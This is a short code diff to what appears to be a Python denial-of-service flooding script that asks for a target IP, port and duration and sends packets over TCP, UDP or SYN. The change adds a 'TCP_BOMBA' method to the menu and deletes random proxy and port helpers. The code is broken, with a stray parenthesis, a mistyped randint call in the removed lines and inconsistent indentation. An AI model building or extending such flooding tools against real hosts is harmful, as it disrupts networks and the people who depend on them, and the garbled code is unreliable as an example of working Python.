@@ -32,7 +32,7 @@ banner = """
 
 print(logo)
 print(banner)
-method = str(input("Method (TCP, UDP, SYN, UDP) : "))
+method = str(input("Method (TCP, UDP, SYN, UDP,TCP_BOMBA) : "))
 
 def UDP():
     ip = str(input("IP : "))
@@ -69,12 +69,7 @@ def TCP():
         s.sendto(data, addr)
         
 def TCP_BOMBA(): 
-def randproxy():
-     ip = ".".join(map(str, (random.randint(o,255)for _ in range(4)))
-def randport():
-      port = random.randint(1000.9000)
-      return port
-      
+	
      ip = str(input("IP : ")))
      port = int(input("PORT : "))
      time = int(input("TIME : "))
